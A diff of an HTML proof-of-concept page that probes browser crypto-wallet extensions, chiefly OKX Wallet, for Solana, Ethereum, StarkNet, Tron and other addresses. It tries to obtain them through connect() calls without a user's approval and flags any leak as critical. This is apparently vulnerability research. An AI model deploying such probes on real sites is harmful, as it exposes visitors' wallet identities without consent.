@@ -5,187 +5,132 @@
 <style>
 body{font-family:monospace;font-size:12px;padding:6px;background:#111;color:#0f0}
 h2{font-size:14px;color:#ff0;margin:8px 0 4px}
-.v{color:#0f0} .x{color:#f00} .n{color:#888}
+.crit{color:#f00;font-weight:bold}
+.ok{color:#0f0}
+.warn{color:#ff0}
 pre{white-space:pre-wrap;word-break:break-all}
 </style>
 </head>
 <body>
-<h2>AUTO-READ: Property Values (no popups)</h2>
-<pre id="out">Reading...</pre>
+<h2>Solana AutoApprove Test</h2>
+<pre id="out">Waiting for providers (5s)...</pre>
 
 <script>
 var r = [];
-function log(s) { r.push(s); }
+function log(s) { r.push(s); update(); }
+function update() { document.getElementById('out').textContent = r.join('\n'); }
 function safe(fn) { try { return fn(); } catch(e) { return 'ERR:' + e.message; } }
-function val(v) {
-  if (v === undefined) return 'undefined';
-  if (v === null) return 'null';
-  if (typeof v === 'string') return '"' + v + '"';
-  if (typeof v === 'boolean') return v.toString();
-  if (typeof v === 'number') return v.toString();
-  try { return JSON.stringify(v).substring(0, 200); } catch(e) { return typeof v + ':' + Object.getOwnPropertyNames(v).slice(0,5).join(','); }
-}
 
-// === 1. OKX Wallet core properties ===
-log('=== okxwallet ===');
-if (typeof window.okxwallet !== 'undefined') {
-  var w = window.okxwallet;
-  log('selectedAddress: ' + val(safe(function(){return w.selectedAddress})));
-  log('chainId: ' + val(safe(function(){return w.chainId})));
-  log('networkVersion: ' + val(safe(function(){return w.networkVersion})));
-  log('okxVersion: ' + val(safe(function(){return w.okxVersion})));
-  log('appVersion: ' + val(safe(function(){return w.appVersion})));
-  log('href: ' + val(safe(function(){return w.href})));
-  log('isDebug: ' + val(safe(function(){return w.isDebug})));
-  log('isOkxWallet: ' + val(safe(function(){return w.isOkxWallet})));
-  log('isRequestAccountCalled: ' + val(safe(function(){return w.isRequestAccountCalled})));
-  log('mobileDiscoverWallet: ' + val(safe(function(){return w.mobileDiscoverWallet})));
-  log('previousChainId: ' + val(safe(function(){return w.previousChainId})));
-  log('pcMode: ' + val(safe(function(){return w.pcMode})));
-} else { log('okxwallet: NOT FOUND'); }
-
-// === 2. Solana — _publicKey, autoApprove ===
-log('\n=== solana ===');
-if (typeof window.solana !== 'undefined') {
-  var s = window.solana;
-  log('_publicKey: ' + val(safe(function(){return s._publicKey})));
-  log('publicKey: ' + val(safe(function(){return s.publicKey})));
-  log('autoApprove: ' + val(safe(function(){return s.autoApprove})));
-  log('isConnected: ' + val(safe(function(){return s.isConnected})));
-  log('isSVM: ' + val(safe(function(){return s.isSVM})));
-} else { log('solana: NOT FOUND'); }
-
-// === 3. SVM ===
-log('\n=== svm ===');
-if (typeof window.svm !== 'undefined') {
-  var sv = window.svm;
-  log('_publicKey: ' + val(safe(function(){return sv._publicKey})));
-  log('publicKey: ' + val(safe(function(){return sv.publicKey})));
-  log('autoApprove: ' + val(safe(function(){return sv.autoApprove})));
-} else { log('svm: NOT FOUND'); }
-
-// === 4. StarkNet — selectedAddress, account ===
-log('\n=== starknet ===');
-var sn = window.starknet || (window.okxwallet && window.okxwallet.starknet);
-if (sn) {
-  log('selectedAddress: ' + val(safe(function(){return sn.selectedAddress})));
-  log('account: ' + val(safe(function(){return sn.account})));
-  log('id: ' + val(safe(function(){return sn.id})));
-  log('name: ' + val(safe(function(){return sn.name})));
-  log('icon: ' + val(safe(function(){return sn.icon})));
-  log('provider: ' + val(safe(function(){return sn.provider})));
-} else { log('starknet: NOT FOUND'); }
-
-// === 5. Ethereum ===
-log('\n=== ethereum ===');
-if (typeof window.ethereum !== 'undefined') {
-  var e = window.ethereum;
-  log('selectedAddress: ' + val(safe(function(){return e.selectedAddress})));
-  log('chainId: ' + val(safe(function(){return e.chainId})));
-  log('networkVersion: ' + val(safe(function(){return e.networkVersion})));
-  log('isMetaMask: ' + val(safe(function(){return e.isMetaMask})));
-  log('isOkxWallet: ' + val(safe(function(){return e.isOkxWallet})));
-} else { log('ethereum: NOT FOUND'); }
-
-// === 6. TronWeb — defaultAddress ===
-log('\n=== tronWeb ===');
-if (typeof window.tronWeb !== 'undefined') {
-  var tw = window.tronWeb;
-  log('defaultAddress: ' + val(safe(function(){return tw.defaultAddress})));
-  log('fullNode: ' + val(safe(function(){return tw.fullNode})));
-  log('solidityNode: ' + val(safe(function(){return tw.solidityNode})));
-} else { log('tronWeb: NOT FOUND'); }
-
-// === 7. Sui ===
-log('\n=== okxsui ===');
-if (typeof window.okxsui !== 'undefined') {
-  var su = window.okxsui;
-  log('chainName: ' + val(safe(function(){return su.chainName})));
-  log('accounts (prop): ' + val(safe(function(){return su.accounts})));
-} else { log('okxsui: NOT FOUND'); }
-
-// === 8. Bitcoin ===
-log('\n=== okxwallet.bitcoin ===');
-if (window.okxwallet && window.okxwallet.bitcoin) {
-  var bt = window.okxwallet.bitcoin;
-  log('keys: ' + safe(function(){return Object.getOwnPropertyNames(bt).join(', ')}));
-  log('selectedAddress: ' + val(safe(function(){return bt.selectedAddress})));
-} else { log('bitcoin: NOT FOUND'); }
-
-// === 9. Nostr ===
-log('\n=== nostr ===');
-var ns = (window.okxwallet && window.okxwallet.nostr) || window.nostr;
-if (ns) {
-  log('keys: ' + safe(function(){return Object.getOwnPropertyNames(ns).join(', ')}));
-  log('_pubkey: ' + val(safe(function(){return ns._pubkey})));
-  log('publicKey: ' + val(safe(function(){return ns.publicKey})));
-} else { log('nostr: NOT FOUND'); }
-
-// === 10. Keplr (Cosmos) ===
-log('\n=== keplr ===');
-if (typeof window.keplr !== 'undefined') {
-  log('keys: ' + safe(function(){return Object.getOwnPropertyNames(window.keplr).slice(0,10).join(', ')}));
-} else { log('keplr: NOT FOUND'); }
-
-// === 11. Aptos ===
-log('\n=== aptos ===');
-if (typeof window.aptos !== 'undefined') {
-  log('keys: ' + safe(function(){return Object.getOwnPropertyNames(window.aptos).join(', ')}));
-  log('account: ' + val(safe(function(){return window.aptos.account})));
-} else { log('aptos: NOT FOUND'); }
-
-document.getElementById('out').textContent = r.join('\n');
-
-// Delayed re-check: providers may inject asynchronously
+// Wait for async provider injection
 setTimeout(function() {
-  var late = ['\n\n===== DELAYED CHECK (5s) ====='];
-  var lateProviders = ['solana','svm','starknet','tronWeb','tronLink','okxsui','okxsuiet',
-    'keplr','compass','leap','aptos','martian','pontem','nostr','phantom'];
-  lateProviders.forEach(function(name) {
-    var obj = window[name];
-    if (typeof obj !== 'undefined') {
-      var keys = [];
-      try { keys = Object.getOwnPropertyNames(obj).slice(0,8); } catch(e) {}
-      late.push('[+] ' + name + ': ' + typeof obj + ' keys=[' + keys.join(',') + ']');
-      // Read key values
-      if (name === 'solana' || name === 'svm') {
-        late.push('  _publicKey=' + val(safe(function(){return obj._publicKey})));
-        late.push('  publicKey=' + val(safe(function(){return obj.publicKey})));
-        late.push('  autoApprove=' + val(safe(function(){return obj.autoApprove})));
-        late.push('  isConnected=' + val(safe(function(){return obj.isConnected})));
-      }
-      if (name === 'starknet') {
-        late.push('  selectedAddress=' + val(safe(function(){return obj.selectedAddress})));
-        late.push('  account=' + val(safe(function(){return obj.account})));
-      }
-      if (name === 'tronWeb') {
-        late.push('  defaultAddress=' + val(safe(function(){return obj.defaultAddress})));
-      }
-      if (name === 'aptos' || name === 'martian' || name === 'pontem') {
-        late.push('  account=' + val(safe(function(){return obj.account})));
-      }
-      if (name === 'nostr') {
-        late.push('  _pubkey=' + val(safe(function(){return obj._pubkey})));
-      }
-    } else {
-      late.push('[-] ' + name + ': not found');
-    }
-  });
-  // Also re-check okxwallet sub-objects
-  if (window.okxwallet) {
-    ['bitcoin','solana','starknet','nostr','aptos','sui','ton','tron'].forEach(function(sub) {
-      var obj = window.okxwallet[sub];
-      if (typeof obj !== 'undefined') {
-        var keys = [];
-        try { keys = Object.getOwnPropertyNames(obj).slice(0,8); } catch(e) {}
-        late.push('[+] okxwallet.' + sub + ': keys=[' + keys.join(',') + ']');
-      }
-    });
-  }
-  document.getElementById('out').textContent = r.join('\n') + '\n' + late.join('\n');
-}, 5000);
+  log('=== PROVIDERS LOADED ===');
 
-document.title = 'v6:' + r.filter(function(l){return l.indexOf('undefined')>-1}).length + 'undef';
+  // 1. Solana connect test
+  if (window.solana) {
+    log('solana found. autoApprove=' + window.solana.autoApprove);
+    log('Before connect: publicKey=' + window.solana.publicKey + ' isConnected=' + window.solana.isConnected);
+    log('Calling solana.connect({onlyIfTrusted:true})...');
+    try {
+      var p = window.solana.connect({onlyIfTrusted: true});
+      if (p && p.then) {
+        p.then(function(resp) {
+          log('SOLANA CONNECT SUCCESS:');
+          log('  resp=' + JSON.stringify(resp));
+          log('  publicKey=' + (resp && resp.publicKey ? resp.publicKey.toString() : 'null'));
+          log('  window.solana.publicKey=' + (window.solana.publicKey ? window.solana.publicKey.toString() : 'null'));
+          log('  isConnected=' + window.solana.isConnected);
+          if (resp && resp.publicKey) {
+            log('*** CRITICAL: Solana address obtained WITHOUT user approval! ***');
+          }
+        }).catch(function(e) {
+          log('solana.connect rejected: ' + e.message);
+          log('(This is expected if autoApprove doesnt bypass confirmation)');
+
+          // Try without onlyIfTrusted
+          log('');
+          log('Trying solana.connect() without onlyIfTrusted...');
+          try {
+            window.solana.connect().then(function(resp) {
+              log('SOLANA CONNECT (no flag) SUCCESS:');
+              log('  publicKey=' + (resp && resp.publicKey ? resp.publicKey.toString() : 'null'));
+              if (resp && resp.publicKey) {
+                log('*** ADDRESS LEAKED via connect() ***');
+              }
+            }).catch(function(e2) {
+              log('solana.connect() also rejected: ' + e2.message);
+            });
+          } catch(e3) { log('connect() error: ' + e3.message); }
+        });
+      } else {
+        log('connect returned sync: ' + JSON.stringify(p));
+      }
+    } catch(e) { log('connect error: ' + e.message); }
+  } else {
+    log('solana: NOT FOUND (still not injected after 5s)');
+  }
+
+  // 2. SVM connect test
+  log('');
+  if (window.svm && window.svm !== window.solana) {
+    log('svm found (separate from solana). autoApprove=' + window.svm.autoApprove);
+  }
+
+  // 3. Ethereum — read selectedAddress after delay
+  log('');
+  if (window.ethereum) {
+    log('ethereum.selectedAddress=' + window.ethereum.selectedAddress);
+    log('ethereum.chainId=' + window.ethereum.chainId);
+  }
+
+  // 4. StarkNet selectedAddress
+  log('');
+  if (window.starknet) {
+    log('starknet.selectedAddress=' + window.starknet.selectedAddress);
+    log('starknet.chainId=' + safe(function(){return window.starknet.chainId}));
+    log('starknet.version=' + safe(function(){return window.starknet.version}));
+  }
+
+  // 5. TronWeb defaultAddress
+  log('');
+  if (window.tronWeb) {
+    log('tronWeb.defaultAddress=' + JSON.stringify(window.tronWeb.defaultAddress));
+    log('tronWeb.ready=' + safe(function(){return window.tronWeb.ready}));
+  }
+
+  // 6. Check all okxwallet sub-provider addresses
+  log('');
+  if (window.okxwallet) {
+    log('=== okxwallet sub-providers ===');
+    if (window.okxwallet.selectedAddress) log('MAIN selectedAddress=' + window.okxwallet.selectedAddress);
+    if (window.okxwallet.bitcoin) {
+      var btcKeys = Object.getOwnPropertyNames(window.okxwallet.bitcoin);
+      log('bitcoin keys: ' + btcKeys.slice(0,10).join(','));
+      // Check for getAccounts without popup
+      if (window.okxwallet.bitcoin.getAccounts) {
+        log('bitcoin.getAccounts exists (function)');
+      }
+    }
+    if (window.okxwallet.solana) {
+      log('okxwallet.solana._publicKey=' + window.okxwallet.solana._publicKey);
+      log('okxwallet.solana.autoApprove=' + safe(function(){return window.okxwallet.solana.autoApprove}));
+    }
+  }
+
+  // 7. Second delayed check for connect results
+  setTimeout(function() {
+    log('');
+    log('=== FINAL STATE (10s) ===');
+    if (window.solana) {
+      log('solana.publicKey=' + (window.solana.publicKey ? window.solana.publicKey.toString() : 'null'));
+      log('solana.isConnected=' + window.solana.isConnected);
+    }
+    if (window.ethereum) {
+      log('ethereum.selectedAddress=' + window.ethereum.selectedAddress);
+    }
+    update();
+  }, 5000);
+
+}, 5000);
 </script>
 </body>
 </html>
